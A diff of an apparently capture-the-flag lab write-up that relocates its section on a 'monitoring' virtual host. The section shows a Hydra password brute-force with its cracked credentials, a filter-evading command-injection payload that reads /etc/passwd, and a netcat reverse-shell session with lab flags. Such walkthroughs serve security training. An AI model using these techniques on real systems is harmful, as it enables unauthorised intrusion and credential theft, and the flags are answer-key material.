@@ -356,6 +356,64 @@ discovered new vhost shopdev2.inlanefreight.local and the flag:
 
 HTB{32596e8376077c3ef8d5cf52f15279ba}
 
+## monitoring.inlanefreight.local
+
+![](./vhosts/monitoring/monitoring1.png)
+
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt monitoring.inlanefreight.local http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-07 06:23:58
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=^USER^&password=^PASS^:F=Invalid
+[STATUS] 2370.00 tries/min, 2370 tries in 00:01h, 14342029 to do in 100:52h, 16 active
+[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-07 06:25:37
+                                                                                 
+```
+
+```
+/ping.php?ip=127.0.0.1%0acat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+
+```
+──(kali㉿kali)-[~/labs/aen]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.111] from (UNKNOWN) [10.129.41.101] 36740
+id
+uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+webdev@dmz01:/var/www/html/monitoring$ ^Z
+zsh: suspended  nc -lvnp 9001
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/labs/aen]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lvnp 9001
+
+webdev@dmz01:/var/www/html/monitoring$ id
+uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+webdev@dmz01:/var/www/html/monitoring$ ls /home
+lab_adm  pixel  srvadm  tom  webdev
+webdev@dmz01:/var/www/html/monitoring$ ls -la /home/srvadm
+total 32
+drwxr-xr-x 3 srvadm srvadm 4096 Jun  1  2022 .
+drwxr-xr-x 7 root   root   4096 May 30  2022 ..
+-rw------- 1 srvadm srvadm   48 Jun  1  2022 .bash_history
+-rw-r--r-- 1 srvadm srvadm  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 srvadm srvadm 3771 Feb 25  2020 .bashrc
+drwx------ 2 srvadm srvadm 4096 Jun  1  2022 .cache
+-rw-r--r-- 1 srvadm srvadm  807 Feb 25  2020 .profile
+-rw-r--r-- 1 srvadm srvadm   33 May 30  2022 flag.txt
+webdev@dmz01:/var/www/html/monitoring$ cat /home/srvadm/flag.txt
+b447c27a00e3a348881b0030177000cd
+webdev@dmz01:/var/www/html/monitoring$ 
+
+```
 
 ## ir.inlanefreight.local
 
@@ -861,59 +919,4 @@ HTB{1nS3cuR3_c00k135}
 |9819|Tom|Resolved|
 |9818|John|HTB{1nS3cuR3_c00k135}|
 
-## monitoring.inlanefreight.local
 
-```
-hydra -l admin -P /usr/share/wordlists/rockyou.txt monitoring.inlanefreight.local http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
-Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-07 06:23:58
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=^USER^&password=^PASS^:F=Invalid
-[STATUS] 2370.00 tries/min, 2370 tries in 00:01h, 14342029 to do in 100:52h, 16 active
-[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-07 06:25:37
-                                                                                 
-```
-
-```
-/ping.php?ip=127.0.0.1%0acat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
-```
-
-
-```
-──(kali㉿kali)-[~/labs/aen]
-└─$ nc -lvnp 9001
-listening on [any] 9001 ...
-connect to [10.10.14.111] from (UNKNOWN) [10.129.41.101] 36740
-id
-uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-webdev@dmz01:/var/www/html/monitoring$ ^Z
-zsh: suspended  nc -lvnp 9001
-                                                                                                                                                                                                                                    
-┌──(kali㉿kali)-[~/labs/aen]
-└─$ stty raw -echo; fg
-[1]  + continued  nc -lvnp 9001
-
-webdev@dmz01:/var/www/html/monitoring$ id
-uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
-webdev@dmz01:/var/www/html/monitoring$ ls /home
-lab_adm  pixel  srvadm  tom  webdev
-webdev@dmz01:/var/www/html/monitoring$ ls -la /home/srvadm
-total 32
-drwxr-xr-x 3 srvadm srvadm 4096 Jun  1  2022 .
-drwxr-xr-x 7 root   root   4096 May 30  2022 ..
--rw------- 1 srvadm srvadm   48 Jun  1  2022 .bash_history
--rw-r--r-- 1 srvadm srvadm  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 srvadm srvadm 3771 Feb 25  2020 .bashrc
-drwx------ 2 srvadm srvadm 4096 Jun  1  2022 .cache
--rw-r--r-- 1 srvadm srvadm  807 Feb 25  2020 .profile
--rw-r--r-- 1 srvadm srvadm   33 May 30  2022 flag.txt
-webdev@dmz01:/var/www/html/monitoring$ cat /home/srvadm/flag.txt
-b447c27a00e3a348881b0030177000cd
-webdev@dmz01:/var/www/html/monitoring$ 
-
-```
